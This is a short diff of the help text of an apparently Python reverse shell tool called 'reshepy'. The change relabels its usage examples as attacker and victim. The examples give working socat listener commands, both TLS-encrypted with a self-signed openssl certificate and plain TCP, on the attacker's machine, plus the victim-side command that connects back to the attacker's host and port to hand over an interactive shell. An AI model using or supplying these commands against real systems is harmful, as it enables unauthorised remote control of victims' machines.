@@ -20,16 +20,16 @@ This script is reverse shell connector
 ----####---- command example ----####----
 
 # secure connection
-## server
+## server(attacker)
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 3650 -nodes -subj "/C=US/ST=/L=/O=/OU=/CN=$SERVER_HOST/emailAddress=/"
 socat $(tty),raw,echo=0 openssl-listen:$SERVER_PORT,reuseaddr,cert=cert.pem,key=key.pem,verify=0
-## client
+## client(victim)
 reshepy --cert cert.pem --host=$SERVER_HOST $SERVER_ADDR:$SERVER_PORT
 
 # insecure connection
-## server
+## server(attacker)
 socat $(tty),raw,echo=0 tcp-listen:$SERVER_PORT,reuseaddr
-## client
+## client(victim)
 reshepy --disable-ssl $SERVER_ADDR:$SERVER_PORT
 '''
     parser = argparse.ArgumentParser(
